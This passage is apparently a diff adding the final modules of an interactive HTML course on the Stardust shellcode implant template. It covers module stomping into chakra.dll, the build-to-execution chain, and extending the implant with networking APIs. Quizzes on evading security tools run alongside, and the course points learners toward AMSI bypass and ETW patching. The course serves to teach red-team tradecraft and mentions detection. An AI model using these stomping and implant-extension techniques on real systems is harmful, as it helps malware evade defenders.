+        VirtualProtect( textBase, sec[i].Misc.VirtualSize, PAGE_READWRITE, &amp;old );
+        memcpy( textBase, shellcode, shellcodeSize );
+        VirtualProtect( textBase, sec[i].Misc.VirtualSize, old, &amp;old );
+
+        // Execute!
+        auto entry = (void(*)()) textBase;
+        entry();
+    }
+}</code></pre>
+
+<h2>Why chakra.dll?</h2>
+<table>
+<tr><th>Property</th><th>Why It's a Good Stomp Target</th></tr>
+<tr><td>Large .text section</td><td>Plenty of room for shellcode</td></tr>
+<tr><td>Microsoft-signed</td><td>Appears legitimate to security tools</td></tr>
+<tr><td>Rarely used by apps</td><td>Loading it doesn't look suspicious</td></tr>
+<tr><td>DONT_RESOLVE_DLL_REFERENCES</td><td>DllMain never runs, minimizing side effects</td></tr>
+</table>
+
+<div class="card warn">
+<h4>Detection Considerations</h4>
+<p>Module stomping isn't invisible. Defenders can detect it by:</p>
+<ul>
+<li><strong>Comparing in-memory .text to on-disk .text</strong> - tools like PE-sieve do this</li>
+<li><strong>Checking for RWX transitions</strong> on known DLL sections</li>
+<li><strong>Monitoring LoadLibraryEx with DONT_RESOLVE_DLL_REFERENCES</strong></li>
+</ul>
+<p>But it's significantly harder to detect than raw private memory allocations.</p>
+</div>
+
+<div class="quiz" id="quiz8">
+<h4>Pop Quiz: Module Stomping</h4>
+<div class="quiz-q" data-correct="2">
+<p>Q1: Why use DONT_RESOLVE_DLL_REFERENCES when loading the stomp target?</p>
+<label data-opt="0"><input type="radio" name="q8_0"> To load it faster</label>
+<label data-opt="1"><input type="radio" name="q8_0"> Because the DLL doesn't exist on disk</label>
+<label data-opt="2"><input type="radio" name="q8_0"> To prevent DllMain from running and the DLL from fully initializing</label>
+<label data-opt="3"><input type="radio" name="q8_0"> To avoid adding it to the PEB module list</label>
+<div class="explain">DONT_RESOLVE_DLL_REFERENCES maps the DLL into memory but skips calling DllMain and resolving imports. This prevents unintended side effects from the DLL's initialization code. Note: the DLL IS still added to the PEB module list, which is actually desirable for appearing legitimate.</div>
+</div>
+<div class="quiz-q" data-correct="0">
+<p>Q2: What's the main advantage of module stomping over VirtualAlloc?</p>
+<label data-opt="0"><input type="radio" name="q8_1"> Code executes from file-backed, signed DLL memory instead of suspicious private memory</label>
+<label data-opt="1"><input type="radio" name="q8_1"> It's faster than VirtualAlloc</label>
+<label data-opt="2"><input type="radio" name="q8_1"> It uses less memory</label>
+<label data-opt="3"><input type="radio" name="q8_1"> The shellcode becomes encrypted automatically</label>
+<div class="explain">Memory allocated by VirtualAlloc is "private" and "unbacked" (not associated with any file). Security tools specifically look for executable private memory. Module stomping puts your code in memory that's associated with a legitimate, signed DLL file, making it harder to flag.</div>
+</div>
+<button class="quiz-btn" onclick="gradeQuiz('quiz8')">Check Answers</button>
+<div class="quiz-result" id="quiz8-result"></div>
+</div>
+
+<div class="nav-btns"><button onclick="goTo(7)">&larr; Previous</button><button class="primary" onclick="goTo(9)">Next: Full Chain &amp; Extending &rarr;</button></div>
+</div>
+
+<!-- ========= MODULE 9 ========= -->
+<div class="module" id="mod9">
+<span class="diff-badge hard">Difficulty: Advanced</span>
+<h1>Module 10: Full Chain &amp; Extending Stardust</h1>
+<p class="subtitle">The complete execution flow and how to build your own implant on top.</p>
+
+<h2>Complete Execution Chain</h2>
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">Stardust Lifecycle: Injection to Execution</h4>
+<div class="flow" style="flex-direction:column;gap:3px;max-width:700px;margin:0 auto;font-size:.82rem">
+<div class="box hl" style="width:100%;font-weight:700">PHASE 1: BUILD</div>
+<div class="box" style="width:100%">NASM assembles entry.x64.asm + utils.x64.asm &rarr; .obj files</div>
+<div class="box" style="width:100%">Clang compiles main.cc + resolve.cc with -nostdlib -Os -fPIC &rarr; .obj files</div>
+<div class="box" style="width:100%">Linker combines objects using linker.ld script &rarr; PE with ordered .text</div>
+<div class="box" style="width:100%">objcopy extracts .text section &rarr; stardust.x64.bin (raw shellcode)</div>
+<div style="text-align:center;color:var(--dim)">&darr;</div>
+<div class="box hl" style="width:100%;font-weight:700">PHASE 2: INJECTION (e.g., Module Stomping)</div>
+<div class="box" style="width:100%">Load chakra.dll with DONT_RESOLVE_DLL_REFERENCES</div>
+<div class="box" style="width:100%">Overwrite .text section with stardust.x64.bin</div>
+<div class="box" style="width:100%">Call entry point &rarr; execution begins at stardust: label</div>
+<div style="text-align:center;color:var(--dim)">&darr;</div>
+<div class="box hl" style="width:100%;font-weight:700">PHASE 3: INITIALIZATION</div>
+<div class="box" style="width:100%">stardust() aligns stack, calls entry()</div>
+<div class="box" style="width:100%">entry() creates instance object, calls instance.start()</div>
+<div class="box y" style="width:100%">Constructor: RipStart() calculates base address + size</div>
+<div class="box y" style="width:100%">Constructor: resolve::module() walks PEB to find ntdll + kernel32</div>
+<div class="box y" style="width:100%">Constructor: RESOLVE_IMPORT replaces hashes with function pointers</div>
+<div style="text-align:center;color:var(--dim)">&darr;</div>
+<div class="box hl" style="width:100%;font-weight:700">PHASE 4: IMPLANT LOGIC</div>
+<div class="box g" style="width:100%">start(): LoadLibraryA(symbol("user32.dll")) loads additional modules</div>
+<div class="box g" style="width:100%">start(): RESOLVE_API resolves MessageBoxA from user32</div>
+<div class="box g" style="width:100%">start(): Calls MessageBoxA("Hello world") - your implant logic goes here!</div>
+</div>
+</div>
+
+<h2>Adding Your Own Functionality</h2>
+<p>Stardust is a template. Here's how to extend it:</p>
+
+<h3>Step 1: Add API Declarations to the Instance</h3>
+<pre><code><span class="lang-tag">C++ - common.h (add to the instance class)</span>struct {
+    uintptr_t handle;
+    struct {
+        D_API( LoadLibraryA )
+        D_API( GetProcAddress )
+        D_API( VirtualAlloc )       // NEW: memory allocation
+        D_API( VirtualProtect )     // NEW: permission changes
+        D_API( CreateThread )       // NEW: threading
+    };
+} kernel32 = {
+    RESOLVE_TYPE( LoadLibraryA ),
+    RESOLVE_TYPE( GetProcAddress ),
+    RESOLVE_TYPE( VirtualAlloc ),       // NEW
+    RESOLVE_TYPE( VirtualProtect ),     // NEW
+    RESOLVE_TYPE( CreateThread ),       // NEW
+};</code></pre>
+
+<h3>Step 2: Use Them in start()</h3>
+<pre><code><span class="lang-tag">C++ - main.cc</span>auto declfn instance::start( void* arg ) -> void {
+    // Allocate executable memory
+    auto mem = kernel32.VirtualAlloc(
+        nullptr, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
+
+    // ... write shellcode to mem ...
+
+    // Make it executable
+    DWORD old;
+    kernel32.VirtualProtect( mem, 4096, PAGE_EXECUTE_READ, &amp;old );
+
+    // All strings must go through symbol&lt;T&gt;()!
+    DBG_PRINTF( "allocated at %p\n", mem );
+}</code></pre>
+
+<h3>Step 3: Adding New Modules</h3>
+<pre><code><span class="lang-tag">C++ - Adding ws2_32.dll for networking</span>// In common.h, add a new module struct:
+struct {
+    uintptr_t handle;
+    struct {
+        D_API( WSAStartup )
+        D_API( socket )
+        D_API( connect )
+        D_API( send )
+        D_API( recv )
+    };
+} ws2_32 = {
+    RESOLVE_TYPE( WSAStartup ),
+    RESOLVE_TYPE( socket ),
+    RESOLVE_TYPE( connect ),
+    RESOLVE_TYPE( send ),
+    RESOLVE_TYPE( recv ),
+};
+
+// In main.cc constructor:
+ws2_32.handle = reinterpret_cast&lt;uintptr_t&gt;(
+    kernel32.LoadLibraryA( symbol&lt;const char*&gt;( "ws2_32.dll" ) )
+);
+RESOLVE_IMPORT( ws2_32 );</code></pre>
+
+<h2>Stardust vs AceLdr: Final Comparison</h2>
+<table>
+<tr><th>Aspect</th><th>AceLdr</th><th>Stardust</th></tr>
+<tr><td>Purpose</td><td>Cobalt Strike UDRL (loads Beacon DLL)</td><td>Standalone implant template</td></tr>
+<tr><td>Language</td><td>C + NASM</td><td>C++20 + NASM</td></tr>
+<tr><td>Compiler</td><td>GCC (MinGW)</td><td>Clang (MinGW target)</td></tr>
+<tr><td>Hash Algorithm</td><td>DJB2 (runtime, pre-computed in Python)</td><td>FNV-1a (consteval, computed by compiler)</td></tr>
+<tr><td>PE in Memory?</td><td>Yes (Beacon DLL is mapped)</td><td>No PE structure at all</td></tr>
+<tr><td>Sleep Evasion</td><td>FOLIAGE APC chain + RC4 encryption</td><td>Not included (add your own)</td></tr>
+<tr><td>Return Addr Spoof</td><td>JMP [RBX] gadget-based</td><td>Not included (add your own)</td></tr>
+<tr><td>Heap Redirection</td><td>Custom heap + GetProcessHeap hook</td><td>Not included (add your own)</td></tr>
+<tr><td>x86 Support</td><td>No (x64 only)</td><td>Yes (both x86 and x64)</td></tr>
+<tr><td>Test Harness</td><td>None (uses Cobalt Strike)</td><td>Module stomper included</td></tr>
+<tr><td>Base Size</td><td>Larger (full loader + hooks)</td><td>~752 bytes (template only)</td></tr>
+</table>
+
+<h2>References &amp; Further Reading</h2>
+<div class="card">
+<h4>Primary Sources</h4>
+<ul>
+<li><strong>Stardust Repository</strong> - <code>github.com/Cracked5pider/Stardust</code></li>
+<li><strong>Author's Blog Post</strong> - <code>5pider.net/blog/2024/01/27/modern-shellcode-implant-design</code></li>
+<li><strong>FNV Hash Specification</strong> - <code>isthe.com/chongo/tech/comp/fnv/</code></li>
+</ul>
+<h4 style="margin-top:15px">Related Projects</h4>
+<ul>
+<li><strong>AceLdr</strong> - <code>github.com/kyleavery/AceLdr</code> (UDRL with sleep evasion)</li>
+<li><strong>TitanLdr</strong> - <code>github.com/SecIdiot/TitanLdr</code> (reflective loader)</li>
+<li><strong>Havoc Framework</strong> - <code>github.com/HavocFramework/Havoc</code> (by the same author, Cracked5pider)</li>
+<li><strong>ShellcodeTemplate</strong> - <code>github.com/Cracked5pider/ShellcodeTemplate</code> (earlier version of Stardust)</li>
+</ul>
+<h4 style="margin-top:15px">Topics to Study Next</h4>
+<ul>
+<li>Indirect Syscalls (avoiding ntdll hooks entirely)</li>
+<li>Sleep obfuscation (combine Stardust with FOLIAGE techniques)</li>
+<li>Return address spoofing (add AceLdr-style gadget spoofing)</li>
+<li>ETW patching (disabling Event Tracing for Windows)</li>
+<li>AMSI bypass techniques</li>
+<li>Thread pool-based execution (TP_WORK callbacks)</li>
+</ul>
+</div>
+
+<div class="quiz" id="quiz9">
+<h4>Final Exam: Full Chain</h4>
+<div class="quiz-q" data-correct="1">
+<p>Q1: In what order does Stardust's initialization happen?</p>
+<label data-opt="0"><input type="radio" name="q9_0"> Resolve APIs &rarr; Find modules &rarr; Calculate base &rarr; Call start()</label>
+<label data-opt="1"><input type="radio" name="q9_0"> Calculate base (RipStart) &rarr; Find modules (PEB walk) &rarr; Resolve APIs (RESOLVE_IMPORT) &rarr; Call start()</label>
+<label data-opt="2"><input type="radio" name="q9_0"> Call start() &rarr; Find modules &rarr; Resolve APIs</label>
+<label data-opt="3"><input type="radio" name="q9_0"> Load DLLs from disk &rarr; Parse PE headers &rarr; Resolve IAT</label>
+<div class="explain">The instance constructor: (1) uses RipStart() to find the base address, (2) uses resolve::module() to find ntdll and kernel32 in the PEB, (3) uses RESOLVE_IMPORT to bulk-resolve all API hashes to function pointers. Then start() is called with all APIs ready to use.</div>
+</div>
+<div class="quiz-q" data-correct="3">
+<p>Q2: To add a new Windows API to Stardust, which files need changes?</p>
+<label data-opt="0"><input type="radio" name="q9_1"> Only main.cc</label>
+<label data-opt="1"><input type="radio" name="q9_1"> resolve.cc and the linker script</label>
+<label data-opt="2"><input type="radio" name="q9_1"> The assembly files and macros.h</label>
+<label data-opt="3"><input type="radio" name="q9_1"> common.h (add D_API + RESOLVE_TYPE to the struct) and main.cc (use the API)</label>
+<div class="explain">Adding an API requires: (1) adding D_API(FuncName) to the struct in common.h, (2) adding RESOLVE_TYPE(FuncName) to the initializer, and (3) calling it in main.cc. The RESOLVE_IMPORT macro handles the rest automatically. No changes needed to resolve.cc, assembly, or the linker script.</div>
+</div>
+<div class="quiz-q" data-correct="2">
+<p>Q3: What does Stardust NOT include that AceLdr does?</p>
+<label data-opt="0"><input type="radio" name="q9_2"> API hashing</label>
+<label data-opt="1"><input type="radio" name="q9_2"> PEB walking</label>
+<label data-opt="2"><input type="radio" name="q9_2"> Sleep masking, return address spoofing, and heap encryption</label>
+<label data-opt="3"><input type="radio" name="q9_2"> Position-independent code</label>
+<div class="explain">Stardust is a template - it provides the foundation (PIC, API resolution, hashing) but not the evasion techniques. AceLdr includes FOLIAGE sleep masking, JMP [RBX] return address spoofing, heap redirection, and RC4 encryption. You'd add these to Stardust yourself based on your needs.</div>
+</div>
+<div class="quiz-q" data-correct="0">
+<p>Q4: What is the total size of a release Stardust x64 binary?</p>
+<label data-opt="0"><input type="radio" name="q9_3"> ~752 bytes</label>
+<label data-opt="1"><input type="radio" name="q9_3"> ~7.5 KB</label>
+<label data-opt="2"><input type="radio" name="q9_3"> ~75 KB</label>
+<label data-opt="3"><input type="radio" name="q9_3"> ~750 KB</label>
+<div class="explain">The base template with MessageBoxA demo compiles to approximately 752 bytes on x64 and 672 bytes on x86. This incredible size is achieved through -Os optimization, -nostdlib (no C runtime), symbol stripping, and the minimal code footprint of the template design.</div>
+</div>
+<button class="quiz-btn" onclick="gradeQuiz('quiz9')">Check Answers</button>
+<div class="quiz-result" id="quiz9-result"></div>
+</div>
+
+<div class="card green" style="margin-top:30px">
+<h4>Course Complete!</h4>
+<p>You now understand Stardust's architecture from entry point to API call. To solidify:</p>
+<ol>
+<li><strong>Clone the repo</strong> and build it yourself (<code>make release</code>)</li>
+<li><strong>Run the stomper</strong> test to see it execute live</li>
+<li><strong>Add a new API</strong> (try VirtualAlloc or CreateFileA) following the extension pattern</li>
+<li><strong>Combine with AceLdr techniques</strong> - add sleep masking or return address spoofing to your Stardust implant</li>
+<li><strong>Read the blog post</strong> at 5pider.net for the author's design philosophy</li>
+</ol>
+</div>
+
+<div class="nav-btns"><button onclick="goTo(8)">&larr; Previous</button><button class="primary" onclick="goTo(0)">Back to Start</button></div>
+</div>
+
+</main>
+
+<script>
+const modules=document.querySelectorAll('.module'),navLinks=document.querySelectorAll('nav a[data-mod]'),totalMods=modules.length;let visited=new Set([0]);
+function goTo(n){modules.forEach(m=>m.classList.remove('active'));navLinks.forEach(a=>a.classList.remove('active'));document.getElementById('mod'+n).classList.add('active');navLinks[n].classList.add('active');visited.add(n);updateProgress();window.scrollTo({top:0,behavior:'smooth'});document.querySelector('nav').classList.remove('open')}
+navLinks.forEach(a=>{a.addEventListener('click',e=>{e.preventDefault();goTo(parseInt(a.dataset.mod))})});
+function updateProgress(){const p=Math.round((visited.size/totalMods)*100);document.getElementById('progressFill').style.width=p+'%';document.getElementById('progressText').textContent=visited.size+' / '+totalMods+' modules'}
+function gradeQuiz(id){const quiz=document.getElementById(id),qs=quiz.querySelectorAll('.quiz-q');let c=0,t=qs.length;qs.forEach(q=>{const ci=parseInt(q.dataset.correct),ls=q.querySelectorAll('label'),sel=q.querySelector('input:checked');ls.forEach(l=>{l.classList.remove('correct','wrong')});if(sel){const si=parseInt(sel.closest('label').dataset.opt);if(si===ci){sel.closest('label').classList.add('correct');c++}else{sel.closest('label').classList.add('wrong');ls[ci].classList.add('correct')}}else{ls[ci].classList.add('correct')}q.querySelector('.explain').style.display='block'});const r=quiz.querySelector('.quiz-result');r.style.display='block';const p=Math.round((c/t)*100);if(p>=80){r.style.background='#34d39920';r.style.color='#34d399';r.textContent=`${c}/${t} (${p}%) - Excellent work!`}else if(p>=50){r.style.background='#fbbf2420';r.style.color='#fbbf24';r.textContent=`${c}/${t} (${p}%) - Good effort! Review the explanations.`}else{r.style.background='#f8717120';r.style.color='#f87171';r.textContent=`${c}/${t} (${p}%) - Re-read this module and try again.`}}
+updateProgress();
+</script>
+</body>
+</html>
